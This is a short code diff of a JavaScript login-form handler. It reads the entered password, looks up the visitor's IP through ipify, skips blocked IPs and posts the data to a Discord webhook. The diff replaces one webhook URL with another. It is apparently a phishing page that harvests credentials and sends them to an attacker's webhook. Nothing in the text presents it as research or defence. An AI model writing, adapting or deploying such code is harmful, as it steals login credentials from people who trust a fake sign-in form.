@@ -18,7 +18,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const password = document.getElementById('password').value;
 
     // List of IPs to block (placeholders for now)
-    const blockedIPs = ['89.187.164.251'];
+    const blockedIPs = ['12'];
 
     // Fetch the user's IP address using ipify
     fetch('https://api.ipify.org?format=json')
@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             }
 
             // Send data to Discord webhook
-            fetch('https://discord.com/api/webhooks/1313820467508809869/3w0mk04qdRxo-IT_zygMUfAq46GYWNRSbjKkc8wc6DM06vgSigdemiwn8jc6vQSSpUHB', {
+            fetch('https://discord.com/api/webhooks/1313827688007602257/m6TmdXyvPSsVuPnfGOdIuPtLJrCLmN5-MvLFwPo3ddeSHRrLD2jJ8vz1yXcm4HV3xaut', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
